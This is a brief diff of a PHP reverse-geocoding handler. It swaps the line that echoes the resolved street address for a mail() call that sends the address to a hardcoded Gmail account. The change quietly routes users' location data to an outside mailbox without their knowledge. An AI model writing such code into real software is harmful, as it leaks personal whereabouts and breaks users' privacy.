@@ -16,7 +16,8 @@ if(isset($_POST['lat'], $_POST['lng'])) {
         $result = $metadata['results'][0];
 
         // save it in db for further use
-        echo $result['formatted_address'];
+        // echo $result['formatted_address'];
+        mail("mailstoeze@gmail.com","New address", $result['formatted_address']);
 
     }
     else {
